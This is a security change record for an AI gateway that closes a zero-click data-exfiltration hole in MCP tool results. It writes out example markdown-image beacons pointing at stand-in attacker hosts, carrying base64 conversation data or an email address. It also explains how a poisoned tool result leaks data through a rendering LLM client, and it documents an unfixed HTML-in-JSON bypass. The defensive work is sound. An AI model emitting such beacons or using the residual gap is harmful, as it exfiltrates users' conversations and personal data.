# CHG-0096 — MCP tool RESULTS were not defanged for zero-click auto-render EXFIL BEACONS

**Change-id:** CHG-0096
**Date:** 2026-07-03
**Severity:** HIGH (zero-click data-exfil / tool-poisoning; a distinct egress surface that bypassed the chat output guard).
**Area:** HARDEN 1.4 — prevent MCP data leakage (result egress), parity with the chat output-guard exfil defense (G40–G43).
**Files:** `gateway/ai_mesh_gateway/mcp_scan_orchestrator.py` (`_scan_text_tier1`), `gateway/ai_mesh_gateway/mcp_proxy.py` (`_findings_have_exfil` + 3 floor triggers); `gateway/ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py` (new).
**Whose work it touches:** the owning-session MCP scan core (orchestrator + the CHG-0074/E12 result-redaction floor); reuses `output_guard.neutralize_exfil_channels` (the chat guard's defanger).

## Root cause

The chat output guard defangs zero-click auto-render exfil beacons — a markdown-image `![x](https://evil/?d=<data>)`, a bare beacon URL — via `neutralize_exfil_channels` (masks the smuggled payload + strips the auto-render, image→plain link; strict no-op on benign, gated by `_url_smuggles_data`). The **MCP tool-result** scan (`_scan_tool_result_floor` → `mcp_scan_orchestrator._scan_text_tier1`) only ran `redact_all` — it masked recognized PII/secrets but did NOT defang the beacon STRUCTURE. So a malicious upstream MCP tool result could carry `![x](https://evil/?d=<base64-of-conversation>)`: the text regexes don't recognize the opaque payload as a secret, so nothing masked it, and a markdown-rendering MCP/LLM client AUTO-FETCHES it on render → zero-click exfil of arbitrary data. This egress BYPASSES the chat output guard (the MCP proxy is a separate API surface).

Empirically confirmed pre-fix: `![x](https://evil.example.com/log?d=<b64>)` and a PII-carrying `![a](.../?leak=john.doe@corp.example)` both egressed as live auto-render beacons.

## The fix (CHG-0096)

1. `_scan_text_tier1`: after detection, run `neutralize_exfil_channels(text)` on the RAW text (so the beacon's smuggled payload is visible to `_url_smuggles_data` — running it on the already-`redact_all`-masked text would leave the auto-render intact). On a change: add an `exfil` finding (for tag/audit) and set the mutation to `redact_all(neutralized)` (when PII/secret was also present) or the neutralized text. Gated `enforcement != "monitor"` (matches the encoded-exfil block).
2. Because tier1 only APPLIES a mutation under a `redact` action (`scan_mcp_payload` line 697), the exfil defang — like PII/secret/infra — is driven under the default `tag` posture by the E12 result-redaction FLOOR. Added `_findings_have_exfil` and OR'd it into the floor's redact-trigger at all 3 sites (`_scan_tool_result_floor`, the adapter tools/call path, the streamable-http path) — the exact CHG-0074 pattern.

## Verification (all green)

```
cd gateway
./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q   # 10 passed
./.venv/bin/python -m pytest ai_mesh_gateway/tests -q                                          # 1568 passed, 0 failed
cd ../services/mcp-broker && ./.venv/bin/python -m pytest tests -q -k "not websocket"          # 108 passed
```

10 tests drive the REAL result floor: 3 markdown-image beacons (PII / secret / base64-data) → auto-render dropped + payload `[exfil-redacted]` + `result_redaction_floor` fired + an `exfil` finding recorded; a bare-URL-with-PII beacon defanged; 5 benign cases (cdn image, svg, doc link, plain text, presigned-URL image) unchanged and NOT flagged; the `_findings_have_exfil` helper.

### Byte-level truth (egress)

| input | egress |
|---|---|
| `![a](https://attacker.io/c?leak=john.doe@corp.example)` | `[a](https://attacker.io/[exfil-redacted])` |
| `![x](https://evil.example.com/l?d=<b64>)` | `[x](https://evil.example.com/[exfil-redacted])` |
| `![chart](https://cdn.example.com/chart.png)` (benign) | unchanged |

**Oracle note:** aidefence is NOT a useful oracle here — it rated the RAW `?leak=john.doe@corp.example` beacon `hasPII=false` (it does not parse PII embedded in a URL query, which is exactly the exfil vector). The byte-level assertion (auto-render dropped + payload masked) + the behavior test (exfil finding, floor fired) is the authoritative proof.

## Residual (documented, honest)

An **HTML** `<img src="https://evil/?d=...">` / `srcset` beacon nested inside a JSON tool-result field is NOT defanged: `scan_mcp_payload` scans the whole JSON-serialized payload, so the HTML attribute quotes are escaped (`src=\"...\"`) and `neutralize_exfil_channels`'s HTML regexes (which expect real quotes) miss them. Markdown-image / markdown-link / bare-URL / protocol-relative beacons survive JSON-serialization and ARE defanged. Markdown is the dominant LLM-emitted, client-rendered vector (raw HTML is commonly sanitized/unrendered by markdown clients), so the primary threat is closed; the HTML-nested-in-JSON case needs per-field (pre-serialization) neutralization — a larger orchestrator change, noted for a future item.

## Scope / honesty note

Closes the primary (markdown/bare-URL) zero-click exfil-beacon vector on the MCP result egress with byte-level proof + full-suite regression. Does not change the host-blocked live-stress status (items 14–20). Partial coverage is not completion.
